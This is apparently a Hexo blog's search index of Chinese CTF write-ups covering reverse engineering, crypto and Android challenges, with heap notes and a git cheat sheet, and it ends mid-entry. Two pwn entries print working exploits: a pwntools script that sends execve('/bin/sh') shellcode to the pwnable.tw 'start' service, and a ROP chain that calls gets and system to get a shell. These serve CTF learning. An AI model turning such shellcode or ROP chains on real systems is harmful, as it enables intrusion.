<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[attackworld-gametime]]></title>
    <url>%2Fattackworld-gametime.html</url>
    <content type="text"><![CDATA[gametime ida 定位主函数 打开程序看看 玩几局发现，程序这游戏就行天天炫舞一样，只不过，我们输错了，它就会退出 破解 既然我们输入的不对就会退出，那不如，我们输入对的就会退出，修改代码sub_1381435sub_1381507两函数虽然一样，但是是不同的函数，只修改一个达不到效果 运行破解之后的程序 在需要输入的地方按下回车键就行了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210C:\Users\TideSec\Desktop\ctf&gt;gametime.exe ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG ZOMGZOMG ZOMGZOMG ZOMGZOMG TAP TAP REVOLUTION!!!!!!! ZOMGZOMG ZOMGZOMG ZOMGZOMG ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG R U READDY?!The game is starting in...Get ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an 's', press the space barZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play..........sZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an 'x', press the 'x' keyZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play........xZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGWhen you see an 'm', press the 'm' keyZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play.....mTRAINING COMPLETE!Now you know everything you need to know....for the rest of your life!LETS PLAY !Get ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to playGet ready to play.....s..x.mooooh, you fancy!!!.....m..x.skey is not (NIIICE JOB)!!!!.....m...s.....m...s....x.....m...s...s...s....xTURBO TIME!key is (no5c30416d6cf52638460377995c6a8cf5).m )(.x )(.m )( key就是要找的flag]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>gametime</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hexo next 7.xx添加背景图片]]></title>
    <url>%2Fhexo-next-7-xx%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87.html</url>
    <content type="text"><![CDATA[主题配置文件_config.yml 找到custom_file_path，将如图所示的代码取消注释 站点根目录 新建文件source/_data/style.styl 输入相关代码12345678910111213141516171819// 添加背景图片body &#123; background: url(https://source.unsplash.com/random/1600x900?wallpapers);//自己喜欢的图片地址 background-size: cover; background-repeat: no-repeat; background-attachment: fixed; background-position: 50% 50%;&#125;// 修改主体透明度.main-inner &#123; background: #fff; opacity: 0.8;&#125;// 修改菜单栏透明度.header-inner &#123; opacity: 0.8;&#125; 效果]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-reverse2]]></title>
    <url>%2Fjactf-reverse2.html</url>
    <content type="text"><![CDATA[简单的逻辑 ida 关键函数 exp12345678910111213In [5]: flag = list("GEV\odzchpc03")In [6]: s = "" ...: for i in range(0,len(flag)): ...: if i%3 == 0: ...: s += chr(ord(flag[i])^3) ...: elif i%3 == 1: ...: s += chr((ord(flag[i])^3)-1) ...: elif i%3 == 2: ...: s += chr((ord(flag[i])^3)-2) ...: print s ...:DES_key_is_10 12345snake~:./rePlease input your flag:DES_key_is_10you got it!GEV\odzchpc03# 真假flag 数学菜鸟在线百度查了下如何求多项式的最大公因式，说是用到了辗转相除法(欧几里得算法),但是好久都没学数学了 在隔壁老阿姨的帮助下，化简了第二个式子g(x) = x^3 + x^2 + x +1 = x^2(x+1) + (x+1) = (x^2 + 1)(x+1)由于第一个公式化简太繁琐，得到解压密码(x+1) ida exp123456789flag = list("lfkmq:b+C~neoyd-~yoog~eho~boxcmb~kdy&#125;oxw")two = list("y0y/|hka~ko??ajtoi")for i in range(0,len(flag)): flag[i] = chr(ord(flag[i])^0xA)for i in range(0,len(two)): two[i] = chr((ord(two[i])^7)-7)print ''.join(i for i in flag)print ''.join(i for i in two) Electroacoustic upx 脱壳12345678910☁ jactf upx -d run Ultimate Packer for eXecutables Copyright (C) 1996 - 2018UPX 3.95 Markus Oberhumer, Laszlo Molnar &amp; John Reiser Aug 26th 2018 File size Ratio Format Name -------------------- ------ ----------- ----------- 913048 &lt;- 402252 44.06% linux/amd64 runUnpacked 1 file. 分析 主要是标注的四个函数,根据函数进行构造输入 exp123456snake~:./run1th input:aaaa2th input:438063th input:9784th input:we11d0ne!Get your key:faded source12☁ jactf file sourcesource: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows dnSpy 定位主函数 主要流程：将输入的字符串进行加密后与key2进行比较 exp1234567891011key1 = list("flag&#123;Thi3_i3+A_wrong+str&#125;")key2 = [24,90,51,23,66,172,49,34,246,240,25,27,224,88,253,50,254,10,7,31,84,5,12,38,15,16,79,117,238]seed = 7flag = ""for i in range(0,len(key2)): for j in range(0,255): if key2[i] == (j + seed ^ ord(key1[seed])) &amp; 0xff: seed = (seed+1)%25 flag +=chr(0x7f &amp; j) breakprint flag reversing ida 将关键跳转修改成如下图所示动态调试即可得到flag disk 思路 一共两个图片，看了一下文件的内容，可以看出来要分析第二张图片 可以在详细信息的备注里看到js的颜文字，直接浏览器 总结 没有目标的明天，是元气满满的一天]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>jactf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-reverse]]></title>
    <url>%2Fjactf-reverse.html</url>
    <content type="text"><![CDATA[平台jactf reverse签到 签到无情，亦有情 re_easy 分析 exp123456789101112131415In [1]: import angrIn [2]: pro = angr.Project("re1")In [3]: pro = angr.Project("re1",auto_load_libs=False)In [4]: sm = pro.factory.simulation_manager(pro.factory.entry_state())In [5]: sm.explore(find=0x40091D,avoid=0x4008FA)Out[5]: &lt;SimulationManager with 1 found, 324 avoid&gt;In [6]: sm.found[0].posix.dumps(0)Out[6]: 'bdctf&#123;YOU_CRAKE_THE_RC4&#125;'In [7]: simplere 分析 我们输入的字符串加密之后与str2比较 关键函数 exp12345678flag = [102,0xA,0x6B,0xC,0x77,0x12,0x21,25,123,78,44,26,41,4,48,82,52,3,46,26,127,93,21,79,86,6,0,31,21,11,85,83,12,0,95,3,85,83,87,7,78,125]for i in range(20,0,-1): flag[i] = flag[i] ^ flag[i-1]for i in range(40,20,-1): flag[i] = flag[i] ^ flag[i+1]print ''.join(chr(i) for i in flag) ELF64 分析 输入的数据md5加密后与780438d5b6e29db0898bc4f0225935c0相比较 somd5 baby_reverse 分析 输入加密比较，没什么可说的 exp12345678flag = list("bIwhroo8cwqgwrxusi")s = ''for i in range(0,len(flag),3): s += chr((ord(flag[i]) ^ 18) - 6) s += chr((ord(flag[i+1]) ^ 18) + 6) s += chr(ord(flag[i+2])^6^18)print s py 找一个在线反编译网站pyc反编译 反编译失败，查看文件头发现少了修改时间于是乎添上，解密得到python代码 1234567891011121314print '[-]Please input your key:'key = raw_input()flag = "=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;"flags = ''for q in range(len(key)): if q % 2 == 0: flags += chr(ord(key[q]) + 10) continue flags += chr(ord(key[q]) - 10)if flags == flag: print '[-]Good!'else: print '[-]Wrong!' exp12345678910flag = list("=Xm/&gt;*&lt;&amp;?*=+:)k)='@)&lt;.@-n)mZn.&lt;")flags = ''for i in range(0,len(flag)): if i % 2 == 0: flags += chr(ord(flag[i]) - 10) continue flags += chr(ord(flag[i]) + 10)print flags C是最好的语言 难道不是我php是最好的语言吗 分析 待续。。。。快下班了,emmm…..]]></content>
      <categories>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>jactf</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-crypto]]></title>
    <url>%2Fjactf-crypto.html</url>
    <content type="text"><![CDATA[平台jactf crypto签到 exp 贝斯家族三英战群魔！ ciphertext.txt base系列加解密 exp 三种来回试吧 easy_crypto exp 凯撒变异了，从第五天开始学起了仿射 太难了，待做 RSA EXP123456789101112131415161718192021e = 65537n = 966808932627497190635859236054960349099463975227350564265384373280336699853387254070662881265937565163000758606154308757944030571837175048514574473061401566330836334647176655282619268592560172726526643074499534129878217409046045533656897050117438496357231575999185527675071002803951800635220029015932007465117818739948903750200830856115668691007706836952244842719419452946259275251773298338162389930518838272704908887016474007051397194588396039111216708866214614779627566959335170676055025850932631053641576566165694121420546081043285806783239296799795655191121966377590175780618944910532816988143056757054052679968538901460893571204904394975714081055455240523895653305315517745729334114549756695334171142876080477105070409544777981602152762154610738540163796164295222810243309051503090866674634440359226192530724635477051576515179864461174911975667162597286769079380660782647952944808596310476973939156187472076952935728249061137481887589103973591082872988641958270285169650803792395556363304056290077801453980822097583574309682935697260204862756923865556397686696854239564541407185709940107806536773160263764483443859425726953142964148216209968437587044617613518058779287167853349364533716458676066734216877566181514607693882375533c = 168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848p = 31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473q = 31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221def egcd(a, b): if a == 0: return (b, 0, 1) else: g, y, x = egcd(b % a, a) return (g, x - (b // a) * y, y)def modinv(a, m): g, x, y = egcd(a, m) if g != 1: raise Exception('modular inverse does not exist') else: return x % md=modinv(e,(p-1)*(q-1))print 'd=',dm=pow(c,d,n)print hex(m)[2:len(hex(m))-1].decode('hex') flag提交不对，不知道为什么 幂数 exp1234567891011121314a = "8842101220480224404014224202480122"a=a.split("0")flag=''for i in range(0,len(a)): str = a[i] list=[] sum=0 for j in str: list.append(j) length = len(list) for k in range(0,length): sum+=int(list[k]) flag += chr(sum+64)print flag]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[jactf-android]]></title>
    <url>%2Fjactf-android.html</url>
    <content type="text"><![CDATA[平台jactf androideasy jadx打开，查看主页面 可以直接看到程序通过得到editText的内容和23异或和代码定义的s进行对比 exp app1 jadx打开，查看主页面 通过输入和VERSION_NAME ^ VERSION_CODE相比 exp simplecheck JEB1234567891011121314151617181920212223242526272829package com.a.simplecheck;import android.content.Context;import android.os.Bundle;import android.support.v7.app.c;import android.view.View$OnClickListener;import android.view.View;import android.widget.Toast;public class MainActivity extends c &#123; public MainActivity() &#123; super(); &#125; protected void onCreate(Bundle arg4) &#123; super.onCreate(arg4); this.setContentView(0x7F04001B); this.findViewById(0x7F0B005F).setOnClickListener(new View$OnClickListener(this.findViewById(0x7F0B005E), ((Context)this)) &#123; public void onClick(View arg4) &#123; if(a.a(this.a.getText().toString())) &#123; Toast.makeText(this.b, "You get it~", 1).show(); &#125; else &#123; Toast.makeText(this.b, "Sorry its wrong", 1).show(); &#125; &#125; &#125;); &#125;&#125; 主页得到输入内容调用a类的a方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.a.simplecheck;public class a &#123; private static int[] a; private static int[] b; private static int[] c; private static int[] d; static &#123; a.a = new int[]&#123;0, 0x8BBD6FE, 205327308, 0x59E0C2D, 138810487, 408218567, 0x4A42485, 0x443BE85, 0x21929A0A, 559010506, 449018203, 576200653, 307283021, 0x1BDF218B, 314806739, 0x1459AAFB, 0x1459AAFB, 0x1C039BBC, 0x18E61B76, 342206934, 392460324, 382290309, 0xB0F0211, 364788505, 210058699, 0xBCF56CF, 0x1580960D, 440064477, 0x1310B245, 0x284EE4B3, 0x1732EFAB, 0x3175430D, 0x1FE113C4, 0x197B593C, 0x33806C28&#125;; a.b = new int[]&#123;13710, 0xB539, 0xBFFF, 36900, 0xE8AC, 0x8C2B, 0xDBD, 0xCEDD, 1509, 0xEF17, 0xF72A, 0x6C2E, 20932, 0x946D, 22069, 0x20F6, 0x84CB, 0xD032, 0x420C, 30902, 0xFC5A, 0xFA1C, 0x73BD, 0x67A9, 0x2EFA, 31610, 0xBDFF, 0x4E00, 0xB256, 0xCB04, 0xFDBC, 0xB0ED, 0xFCF0, 0x90F4&#125;; a.c = new int[]&#123;0x94F1, 0xE00B, 0x580A, 0xBA97, 8940, 0x136F, 27050, 56102, 0x5524, 0xA0D6, 0xF7D5, 0xD0CE, 0x705A, 0xE74F, 0x4017, 0xFB54, 0x930C, 0xE9F8, 0xA13C, 0x6528, 27501, 0x9820, 0x90AF, 0x9545, 0xF192, 0xA9E9, 0x2405, 9879, 0x3864, 60468, 0x4DD6, 0xB85E, 8406, 0xFC9A&#125;; a.d = new int[]&#123;0, 0xEB9D9218, -370404060, 0xF0A59DD2, -494024809, 0xF7EFFC3F, 54930974, 0xF6B60C82, 0x203630EA, 0xF99AF01A, 0xF85E01A6, 0xFCF9241, 0x1072E161, 119059597, 202392013, 0x10E88ED9, 0x786F15C, -68971076, 0xF91DD26, 0xBC673D6, 0xFF3B4367, -10293675, 0x598502B, 0x7406995, 0x9FB416F, 0x758311F, 221507, 0xF6EB9D4, 180963987, 107841171, 41609001, 0x107B88B5, 0xA21BFA2, 0x1075D862&#125;; &#125; public static boolean a(String arg8) &#123; boolean v1 = false; if(arg8.length() == a.b.length) &#123; int[] v4 = new int[a.a.length]; v4[0] = 0; byte[] v5 = arg8.getBytes(); int v6 = v5.length; int v0 = 0; int v3 = 1; while(v0 &lt; v6) &#123; v4[v3] = v5[v0]; ++v3; ++v0; &#125; v0 = 0; while(true) &#123; if(v0 &gt;= a.c.length) &#123; break; &#125; else if(a.a[v0] == a.b[v0] * v4[v0] * v4[v0] + a.c[v0] * v4[v0] + a.d[v0] &amp;&amp; a.a[v0 + 1] == a.b[v0] * v4[v0 + 1] * v4[v0 + 1] + a.c[v0] * v4[v0 + 1] + a.d[v0]) &#123; ++v0; continue; &#125; return v1; &#125; v1 = true; &#125; return v1; &#125;&#125; a.b[v0] v4[v0] v4[v0] + a.c[v0] v4[v0] + a.d[v0] &amp;&amp; a.a[v0 + 1] == a.b[v0] v4[v0 + 1] v4[v0 + 1] + a.c[v0] v4[v0 + 1] + a.d[v0] 可以将这句话改进一下进行爆破 exp1234567891011121314151617a = [0, 146527998, 205327308, 94243885, 138810487, 408218567, 77866117, 71548549, 563255818, 559010506, 449018203, 576200653, 307283021, 467607947, 314806739, 341420795, 341420795, 469998524, 417733494, 342206934, 392460324, 382290309, 185532945, 364788505, 210058699, 198137551, 360748557, 440064477, 319861317, 676258995, 389214123, 829768461, 534844356, 427514172, 864054312]b = [13710, 46393, 49151, 36900, 59564, 35883, 3517, 52957, 1509, 61207, 63274, 27694, 20932, 37997, 22069, 8438, 33995, 53298, 16908, 30902, 64602, 64028, 29629, 26537, 12026, 31610, 48639, 19968, 45654, 51972, 64956, 45293, 64752, 37108]c = [38129, 57355, 22538, 47767, 8940, 4975, 27050, 56102, 21796, 41174, 63445, 53454, 28762, 59215, 16407, 64340, 37644, 59896, 41276, 25896, 27501, 38944, 37039, 38213, 61842, 43497, 9221, 9879, 14436, 60468, 19926, 47198, 8406, 64666]d = [0, -341994984, -370404060, -257581614, -494024809, -135267265, 54930974, -155841406, 540422378, -107286502, -128056922, 265261633, 275964257, 119059597, 202392013, 283676377, 126284124, -68971076, 261217574, 197555158, -12893337, -10293675, 93868075, 121661845, 167461231, 123220255, 221507, 258914772, 180963987, 107841171, 41609001, 276531381, 169983906, 276158562]s = ''for v0 in range(1,len(c)): for i in range(0,255): if a[v0] == b[v0] * i * i + c[v0] * i + d[v0] and a[v0] == b[v0-1] * i * i + c[v0-1] * i +d[v0-1]: s += chr(i)print s#a[v0] == b[v0] * v4[v0] * v4[v0] + c[v0] * v4[v0] + d[v0]#a[v0] == b[v0-1] * v4[v0] * v4[v0] + c[v0-1] * v4[v0] +d[v0-1]## flag&#123;MAth_i&amp;_GOOd_DON7_90V_7hInK?&#125; DDCTF-Easy jadx定位关键代码 输入的字符与i()函数返回的字符串相比较 exp1234567891011121314151617m = "com.didi_ctf.flagapp.FlagActivity"p = [-40, -62, 107, 66, -126, 103, -56, 77, 122, -107, -24, -127, 72, -63, -98, 64, -24, -5, -49, -26, 79, -70, -26, -81, 120, 25, 111, -100, -23, -9, 122, -35, 66, -50, -116, 3, -72, 102, -45, -85, 0, 126, -34, 62, 83, -34, 48, -111, 61, -9, -51, 114, 20, 81, -126, -18, 27, -115, -76, -116, -48, -118, -10, -102, -106, 113, -104, 98, -109, 74, 48, 47, -100, -88, 121, 22, -63, -32, -20, -41, -27, -20, -118, 100, -76, 70, -49, -39, -27, -106, -13, -108, 115, -87, -1, -22, -53, 21, -100, 124, -95, -40, 62, -69, 29, 56, -53, 85, -48, 25, 37, -78, 11, -110, -24, -120, -82, 6, -94, -101]q = [-57, -90, 53, -71, -117, 98, 62, 98, 101, -96, 36, 110, 77, -83, -121, 2, -48, 94, -106, -56, -49, -80, -1, 83, 75, 66, -44, 74, 2, -36, -42, -103, 6, -115, -40, 69, -107, 85, -78, -49, 54, 78, -26, 15, 98, -70, 8, -90, 94, -61, -84, 64, 112, 51, -29, -34, 126, -21, -126, -71, -31, -24, -60, -2, -81, 66, -84, 85, -91, 10, 84, 70, -8, -63, 26, 126, -76, -104, -123, -71, -126, -62, -23, 11, -39, 70, 14, 59, -101, -39, -124, 91, -109, 102, -49, 21, 105, 0, 37,-127, -57, 117, 110, -115, -86, 56, 25, -46, -55, 7, -125, 109, 76, 104, -15, 82, -53, 18, -28, -24]bArr = [i for i in range(0,len(p))]for i in range(0,len(bArr)): bArr[i] = p[i] ^ q[i]b = bArr[0]i2 = 0while bArr[b+i2] != 0: i2 += 1bArr2 = [i for i in range(0,i2)]for j in range(0,i2): bArr2[j] = bArr[b+j]print ''.join(chr(i) for i in bArr2)flag:DDCTF-3ad60811d87c4a2dba0ef651b2d93476@didichuxing.com app2 jadx 这题是有脑洞的，之前做过所以很快定位到了需要解密的字符串 AES_128_ECB_PKCS5Padding_Decrypt加密，密钥为thisisatestkey== 解密 总结 总体来说不算太难，除了最后第一是个坑之外，基本没涉及到so层的概念，是些入门很好的题目，感谢平台提供的练习机会]]></content>
      <categories>
        <category>android</category>
      </categories>
      <tags>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.tw-start]]></title>
    <url>%2Fpwnable-tw-start.html</url>
    <content type="text"><![CDATA[start checksec ida查看 发现只有两个函数，_start 和 _exit ，看到int 80得知，此程序是通过系统调用的方式达到调用函数的目的 gdb调试得知偏移为20 exp12345678910111213141516171819202122232425from pwn import *context.arch = 'i386'context.log_level="debug"pro = remote("chall.pwnable.tw",10000)ret = 0x8048087shellcode = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"'''shellcode = asm('\n'.join([ 'push %d' % u32('/sh\0'), 'push %d' % u32('/bin'), 'xor edx, edx', 'xor ecx, ecx', 'mov ebx, esp', 'mov eax, 0xb', 'int 0x80',]))'''pro.readuntil("CTF:")pro.send('a'*20 + p32(ret))shell_addr = u32(pro.recv()[:4])pro.send('A'*20+p32(shell_addr+20)+shellcode)pro.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Heap的学习(1)]]></title>
    <url>%2FHeap%E7%9A%84%E5%AD%A6%E4%B9%A0-1.html</url>
    <content type="text"><![CDATA[前言 对于堆方面的内容，在没有别人帮助的情况下，学起来就很吃力，不像栈那么好理解，本篇记录我对堆的一些了解，不足之处，还望斧正。 什么是堆 栈无法满足将函数内部的数据传递到函数的外部，虽然有全局变量可以传递，但是不能动态的产生，只能在编译的时候定义，在很多情况下显得鸡肋，这时候堆(Heap)就成了一种选择。堆是一个巨大的空间，常常占据着整个虚拟空间的绝大部分，在这片空间里，程序可以请求一块连续的内存并自由使用，直到程序主动放弃之前都会有效。 堆管理 程序向操作系统申请一块适当大小的堆空间，然后有程序自己管理这块空间，具体来讲，管理着堆空间分配的往往是程序的运行库，运行库相当于从系统批发了一块较大的堆空间，然后零售给程序用，当售完或程序有大量的内存需求时，在根据实际需求再次向系统申请进货，运行库通过堆的分配算法来管理程序的对空间。 Linux下提供两种堆空间分配的方式，及两个系统调用：brk() 系统调用brk()的c语言形式声明如下：1234int brk(void* end_data_segment)实际作用就是设置进程数据段(Linux下将数据段和BSS段合在一起统称位数据段)的结束地址，及它可以扩大或缩小数据段，达到扩大或缩小堆空间的效果。glibc中还有一个函数交sbrk，它是对brk函数的封装，只不过参数和返回值略有不同，sbrk以一个增量(Increment)作为参数，及需要增加(负数为减少)的空间大小，返回值是增加或减少后数据段的结束地址 mmap() 系统调用mmap()的c语言形式声明如下：123456789void *mmap( void *start, 指定申请空间的起始地址，如果置为0，那么Linux会自动挑选合适的起始地址 size_t length, 指定申请空间的长度 int prot, 申请空间的权限(可读，可写，可执行) int flags, 映射类型(文件映射、匿名空间) int fd, 用于文件映射时指定文件描述符 off_t offset 用于文件映射时指定文件偏移);作用就是向操作系统申请一段虚拟地址空间，当然这块虚拟地址空间可以映射到某个文件(这也是这个系统跳用最初的作用)，当他不将地址空间映射到某个文件时，称这段空间为匿名空间，匿名空间可以拿来当作堆空间。 堆结构这里可以参考CTF pwn 中最通俗易懂的堆入坑指南，在看博客的时候产生一个疑问，为什么malloc(8)的值为0x21，后来自己写了程序，调试查看以及在网友的帮助下知道了原因。1264位系统malloc(8) 由于需要内存对齐，所以8需要对齐到16，然后加上pre size、size以及prev_inuse的值，也就是文中的16+8+8+1=0x21的由来，但是当malloc(24)的时候，发现系统给的空间也是0x21，这就又产生了疑问，不是应该为32+8+8+1=0x31吗，后来询问网友得知，内存空间复用这个神奇的操作，也就是当前的堆会占用下一个堆的pre size(前提：下一个堆的前一个chunk是使用状态)，所以malloc(24) 24&lt;16+8 所以，还是会分配0x21的空间给他 32位和64位原理一样，只不过，对齐的到的大小不一样，64位对齐到16，32位对齐到8 可以观察到，程序在第一次malloc之后会产生heap，并且大小是132kb，个人测试，32位也同样是132kb，往后，如果程序再malloc的时候就会从这里面申请，132kb的空间就是arena，由于是主线程分配的，所以也叫main arena top chunk的size会由于每次的malloc而减小 free函数 将free掉的chunk放在不同的bin中 1234fast binsmall binlarge binunsorted bin 总结 对于堆，总是感觉学了一遍，两遍，都不清楚到底是干嘛的，更加谈不上如何利用 Reference《程序员的自我修养》 CTF pwn 中最通俗易懂的堆入坑指南]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>heap</tag>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PWN 学习—某平台ROP2 writeup]]></title>
    <url>%2FPWN-%E5%AD%A6%E4%B9%A0%E2%80%94%E6%9F%90%E5%B9%B3%E5%8F%B0ROP2-writeup.html</url>
    <content type="text"><![CDATA[64位栈帧学习 writeup本能反应 RELRO：RELRO会有Partial RELRO和FULL RELRO，如果开启FULL RELRO，意味着我们无法修改got表Stack：如果栈中开启Canary found，那么就不能用直接用溢出的方法覆盖栈中返回地址，而且要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过NX：NX enabled如果这个保护开启就是意味着栈中数据没有执行权限，以前的经常用的call esp或者jmp esp的方法就不能使用，但是可以利用rop这种方法绕过PIE：PIE enabled如果程序开启这个地址随机化选项就意味着程序每次运行的时候地址都会变化，而如果没有开PIE的话那么No PIE (0x400000)，括号内的数据就是程序的基地址 执行程序 发现输入一定的长度，程序就崩溃了 ida打开程序 查看要程序逻辑发现存在栈溢出漏洞输入长度大于 0xC (0x4 + 0x8) 面就是我们的天下了 查看函数表 发现函数joke 似乎用不到的函数 接下来查看字符串 我无敌的/bin/sh字符串竟然没有，还好有gets和system函数 思考利用方法 调用gets函数像bss段写入/bin/sh，然后调用system函数执行system(“/bin/sh”); 实操过程 这里解释一下，由于gets函数只有一个参数，所以调用gets函数时，需要向rdi传入传入那个参数pop rdi ; ret 的作用就是将当前栈顶的值存到rdi中所以构造payload 为 p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)程序执行到pop_rdi_ret时的栈顶就是bss的地址，然后就将bss地址存入rdi中，然后调用gets函数 接下来时调用system函数 我们知道，调用一个函数后，那个函数的下一个地址就会成为函数执行完后需要执行的第一个地方我们在payload后面追加p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)，原理与gets函数相同，gets往bss地址写入/bin/sh，system调用bss地址的/bin/sh，即达到了调用/bin/sh的作用 此时栈空间如图 附上payload123456789101112131415161718from pwn import *pro = remote("ip",port)pros = ELF('./rop2')bss = 0x6010F0pop_rdi_ret = 0x4008e3system_addr = pros.symbols['system']gets_addr = pros.symbols['gets']payload = 'a'*4 +'a'*8 payload += p64(pop_rdi_ret) + p64(bss) + p64(gets_addr)payload += p64(pop_rdi_ret) + p64(bss)+ p64(system_addr)pro.readuntil("~")pro.sendline(payload)pro.sendline("/bin/sh")pro.interactive() 总结&gt; PWN 学习之路永无止境]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>pwntools</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git学习小记]]></title>
    <url>%2Fgit%E5%AD%A6%E4%B9%A0%E5%B0%8F%E8%AE%B0.html</url>
    <content type="text"><![CDATA[一、设置账户名和账户邮箱123git config --global user.name "name"git config --global user.email "name@gmail.comgit config --global http.proxy http://example.com:port 二、验证账户名和账户邮箱12git config --global user.namegit config --global user.email 三、初始化仓库1git init 会生成 .git 文件夹，关于这个仓库的配置 四、添加文件及文件夹1234git add name添加所有文件git add . 五、添加描述(必须添加)1git commit -m "hello world" 六、查看状态1git status 七、查看修改的文件1git diff -- filename 八、撤销修改1git checkout filename 九、撤销修改(针对git add提交之后的)12git reset HEAD filenamegit checkout filename 十、查看提交记录1234git loggit log logid -1 -p-1 表示只看到上面的一条记录-p 表示查看这条记录的所有信息 十一、上传文件1234git remote add origin github仓库地址如遇"fatal: remote origin already exists."此问题输入 git remote rm origingit push origin master 十二、分支1234567891011121314151617181920查看分支git branch当前分支前面会有一个*创建分支git branch version1.0切换分支git checkout version1.0将version1.0同步到当前分支git merge version1.0删除分支git branch -D version1.0克隆远程项目git clone git@github.com:name/项目名.git将当前修改上传到服务器git push origin master将远程修改同步到本地git fetch origin master注：此方法不会将修改同步到当前分支，而是会同步到origin/master分支上，需要使用git merge origin/master同步到当前分支git pull origin master此方法是fetch和merge两者的合并 十三、其他1234创建密钥ssh-keygen -t rsa -C "name@gmail.com"将公钥添加到githubcat .ssh/id_rsa.pub]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[attackworld-web2]]></title>
    <url>%2Fattackworld-web2.html</url>
